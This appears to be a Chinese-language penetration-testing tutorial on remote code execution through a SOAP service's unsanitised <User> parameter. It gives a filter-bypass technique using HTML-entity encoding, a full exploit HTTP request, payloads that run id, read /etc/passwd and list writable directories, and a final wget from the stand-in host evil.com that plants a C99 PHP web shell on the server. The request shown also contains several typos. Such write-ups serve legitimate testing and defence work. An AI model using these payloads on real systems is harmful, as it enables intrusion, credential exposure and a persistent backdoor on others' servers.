
## SOAP 服务中的远程代码执行（RCE）

如果 SOAP 消息未正确处理，且用户提供的输入未经适当清理和验证就插入 Shell 函数，则可能导致 RCE。

考虑一个在渗透测试中发现的基于 SOAP 服务的 RCE 示例。通过 `<user>` 参数提供的输入直接插入到 shell 函数中，导致命令执行。后端操作系统被枚举为 Linux，因此提供了 `id` 命令，该命令将显示用户和组 ID。以下是提供的初始有效载荷：

**有效载荷**
```
"& id &"
```

然而，从响应中可以明显看出，应用程序实现了一个黑名单过滤器，过滤单/双引号字符。为了绕过此过滤器，有效载荷可以编码为 HTML 实体，字符 `&` 可以表示为 `&amp`，双引号可以表示为 `&quot;`。修改后的混淆载荷如下：

**混淆载荷**
```html
&quot;&amp id &&quot;
```

请求如下所示：

**请求**
```http
POST /cgi-bin/Tmgm/server.php HTTP/1.1
Content-Type: text/xml
SOAPAction: "http://localhost/#Tmgm_Auth"
Content-Length: 632 Host: localhost
Connection: Keep-alive
Accept-Encoding: gzip/detlate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOWE4) AppleWebKit/537.3E (KHTML, like Gecko) Chrome/28.0.1500.
Accept: /

<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas xmlns:xsd="www.w3.org/1999/XMLSchema" xmlns:xsi="http://wwv.v3.org/1999/XMLSchema-instance" xml. xmlns:SOAP-ENC"http://schemas.xmlsoap.org/soap/encoding/" xmlns:urn="http://localhost/">
    <SOAP-ENV:Header/>
    <SOAP-ENV:Body>
        <Tmgm_Auth>
            <Action>1</Action>
            <User>&quot;&amp id &&quot;</User>
            <Password>test</Passvord>
        </Tmgm_Auth>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

输出证实应用程序确实容易受到 RCE 攻击。

接下来，尝试访问 /etc/shadow 文件，该文件保存着关键用户数据，包括加密密码；但由于应用程序未以 root 身份运行，因此未返回任何内容。然而，“/etc/passwd”对所有本地用户可读。

**有效载荷**
```html
&quot;&amp cat /etc/passwd &&quot;
```

###  查找可写目录

接下来，为了上传 shell/后门，需要一个可写目录。使用以下有效载荷枚举目录。

**有效载荷**
```html
&quot;&amp ls -l /var/www/cgi-bin&&quot;
```

### 上传 Shell 以实现 RCE

从响应中，识别出几个可写目录，其中一个为“M2M”，用于上传 C99 PHP shell。使用 wget 命令获取 shell.txt（包含我们的 C99 PHP shell）的内容并将其写入 M2M 目录：

**有效载荷**
```html
&quot;&amp wget "http://www.evil.com/shell.txt" -O /var/www/cgi-bin/M2M/shell.php &&quot;
```
